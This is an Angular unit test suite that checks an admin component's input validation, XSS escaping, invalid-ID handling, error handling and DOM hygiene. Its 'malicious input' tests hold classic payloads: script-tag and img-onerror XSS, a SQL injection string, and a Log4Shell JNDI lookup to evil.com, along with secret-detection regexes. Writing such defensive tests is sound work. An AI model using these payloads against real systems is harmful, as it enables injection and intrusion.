/**
 * Basic Security Test Suite
 * Simple security tests to validate the testing framework setup
 */

import { TestBed, ComponentFixture } from '@angular/core/testing';
import { FormsModule } from '@angular/forms';
import { AdminComponent } from '../admin.component';
import { ZtmmDataWebService } from '../services/ztmm-data-web.service';
import { TestUtilsIndexedDB } from '../testing/test-utils-indexeddb';

describe('Basic Security Tests', () => {
  let component: AdminComponent;
  let fixture: ComponentFixture<AdminComponent>;
  let mockDataService: any;

  beforeEach(async () => {
    mockDataService = TestUtilsIndexedDB.createMockZtmmDataWebService();

    await TestBed.configureTestingModule({
      imports: [AdminComponent, FormsModule],
      providers: [
        { provide: ZtmmDataWebService, useValue: mockDataService }
      ]
    }).compileComponents();

    fixture = TestBed.createComponent(AdminComponent);
    component = fixture.componentInstance;
    fixture.detectChanges();
  });

  describe('Input Validation Security', () => {
    it('should prevent empty pillar names', async () => {
      component.newPillar = '';
      await component.addPillar();

      // Should not call the service with empty input
      expect(mockDataService.addPillar).not.toHaveBeenCalled();
    });

    it('should prevent empty function capability names', async () => {
      component.newFunctionCapability = '';
      component.selectedPillarId = null;
      await component.addFunctionCapability();

      // Should not call the service with invalid input
      expect(mockDataService.addFunctionCapability).not.toHaveBeenCalled();
    });

    it('should handle malicious input gracefully', () => {
      const maliciousInputs = [
        '<script>alert("XSS")</script>',
        'javascript:alert(1)',
        '"; DROP TABLE users; --',
        '${jndi:ldap://evil.com/a}'
      ];

      maliciousInputs.forEach(input => {
        expect(() => {
          component.newPillar = input;
          component.newFunctionCapability = input;
        }).not.toThrow();
      });
    });
  });

  describe('XSS Protection', () => {
    it('should not execute script tags in pillar names', () => {
      const maliciousScript = '<script>window.xssExecuted = true;</script>';
      component.newPillar = maliciousScript;
      fixture.detectChanges();

      // Verify script was not executed
      expect((window as any).xssExecuted).toBeFalsy();
    });

    it('should sanitize HTML in component template', () => {
      const maliciousHtml = '<img src=x onerror=alert(1)>';
      component.newPillar = maliciousHtml;
      fixture.detectChanges();

      const compiledTemplate = fixture.nativeElement;
      // Should not contain unescaped HTML
      expect(compiledTemplate.innerHTML).not.toContain('<img src=x onerror');
    });
  });

  describe('Data Access Security', () => {
    it('should handle invalid IDs safely', () => {
      const invalidIds = [-1, 999999, null, undefined, 'admin', '../admin'];

      invalidIds.forEach(id => {
        expect(() => {
          component.getPillarName(id as any);
          component.getFunctionCapabilityName(id as any);
        }).not.toThrow();
      });
    });

    it('should return safe default values for invalid IDs', () => {
      expect(component.getPillarName(-1)).toBe('Unknown');
      expect(component.getFunctionCapabilityName(999999)).toBe('Unknown');
    });
  });

  describe('Error Handling Security', () => {
    it('should not expose sensitive information in errors', async () => {
      // Mock an error from the service
      mockDataService.getPillars.and.returnValue(Promise.reject(new Error('Database connection failed')));

      spyOn(console, 'error');

      await component.loadAll();

      // Should log error for debugging but not expose to user
      expect(console.error).toHaveBeenCalled();
    });

    it('should handle service errors gracefully', async () => {
      mockDataService.addPillar.and.returnValue(Promise.reject(new Error('Service error')));

      spyOn(console, 'error');
      component.newPillar = 'Test Pillar';

      await component.addPillar();

      // Should handle error without crashing
      expect(console.error).toHaveBeenCalled();
    });
  });

  describe('State Management Security', () => {
    it('should maintain secure component state', () => {
      const originalTab = component.activeTab;

      // Test that component state is maintained properly
      component.activeTab = 'pillars';
      expect(component.activeTab).toBe('pillars');

      component.activeTab = 'functions';
      expect(component.activeTab).toBe('functions');

      // Should handle invalid states gracefully
      (component as any).activeTab = 'invalid-tab';
      expect(component.activeTab).toBeDefined();
    });

    it('should isolate component instances', () => {
      const fixture2 = TestBed.createComponent(AdminComponent);
      const component2 = fixture2.componentInstance;

      // Components should not share state
      component.activeTab = 'pillars';
      component2.activeTab = 'functions';

      expect(component.activeTab).not.toBe(component2.activeTab);
    });
  });

  describe('DOM Security', () => {
    it('should not have inline event handlers', () => {
      const compiled = fixture.nativeElement;

      // Check for CSP violations
      const inlineHandlers = compiled.querySelectorAll('[onclick], [onload], [onerror]');
      expect(inlineHandlers.length).toBe(0);
    });

    it('should not expose sensitive data in DOM', () => {
      const compiled = fixture.nativeElement;
      const htmlContent = compiled.innerHTML;

      // Should not contain sensitive patterns
      expect(htmlContent).not.toMatch(/password|secret|token/i);
      expect(htmlContent).not.toMatch(/[a-f0-9]{32,}/); // No long hashes/tokens
    });
  });

  describe('Form Security', () => {
    it('should validate form inputs properly', () => {
      // Test required field validation
      const pillarInput = fixture.debugElement.nativeElement.querySelector('input[name="newPillar"]');
      if (pillarInput) {
        expect(pillarInput.hasAttribute('required') || pillarInput.hasAttribute('minlength')).toBeTruthy();
      }
    });

    it('should prevent form submission with invalid data', async () => {
      // Test form validation prevents submission
      component.newPillar = '';
      await component.addPillar();

      expect(mockDataService.addPillar).not.toHaveBeenCalled();
    });
  });
});
